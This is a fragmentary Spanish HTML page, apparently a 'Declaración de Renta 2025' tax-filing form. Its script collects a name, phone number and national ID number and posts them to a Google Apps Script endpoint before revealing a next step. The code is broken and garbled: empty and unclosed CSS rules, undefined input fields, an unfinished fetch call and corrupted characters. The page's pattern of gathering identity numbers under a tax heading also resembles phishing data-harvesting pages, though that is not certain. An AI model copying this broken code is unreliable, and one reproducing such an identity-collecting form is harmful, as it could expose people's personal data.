      text-align: center;
    }
    header {
      background-color: #042d64;

      border-radius: 10px;

    input {

    }
    button {
      background-color: #0092E8;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 5px;
      cursor: pointer;

      margin-top: 10px;
    }
    button:hover {

    .hidden {

    .whatsapp-btn {

</head>
<body>

  <header>

  </header>

  <div class="container" id="form-container">
    <h2>Declaraci贸n de Renta 2025</h2>

    <input type="text" id="nombre" placeholder="Nombre completo" required>

  <script>
    function enviarDatos() {
      const nombre = document.getElementById('nombre').value.trim();

      if (!nombre || !celular || !cedula) {
        alert("Por favor llena todos los campos.");
        return;
      }

      fetch("https://script.google.com/macros/s/AKfycbziyIE59HPVIrGIm5qyv04vbr53tLNCOWVJdITjB5VY1UQ-Z_6cX_HupGtWDzWCXSL64A/exec", {
        method: "POST",
        body: new URLSearchParams({ nombre, celular, cedula })

      .then(res => res.text())
      .then(() => {
        document.getElementById('form-container').classList.add('hidden');
        document.getElementById('next-step').classList.remove('hidden');
      })
      .catch(err => {
        console.error(err);
